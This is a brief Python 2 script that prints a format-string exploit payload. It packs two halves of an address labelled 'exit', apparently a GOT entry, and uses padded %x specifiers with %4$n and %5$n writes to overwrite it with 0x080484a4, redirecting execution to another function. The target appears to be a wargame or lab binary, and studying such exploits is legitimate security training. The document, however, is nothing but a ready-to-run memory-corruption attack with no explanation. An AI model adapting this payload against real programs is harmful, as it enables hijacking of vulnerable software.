#!/usr/bin/python 

import struct

o = 0x80484a4
exit = 0x8049838

exp = struct.pack("I", exit)
exp += struct.pack("I", exit + 2)
exp += "%33948x"
exp += "%4$n"

exp += "%33632x"
exp += "%5$n"

print exp
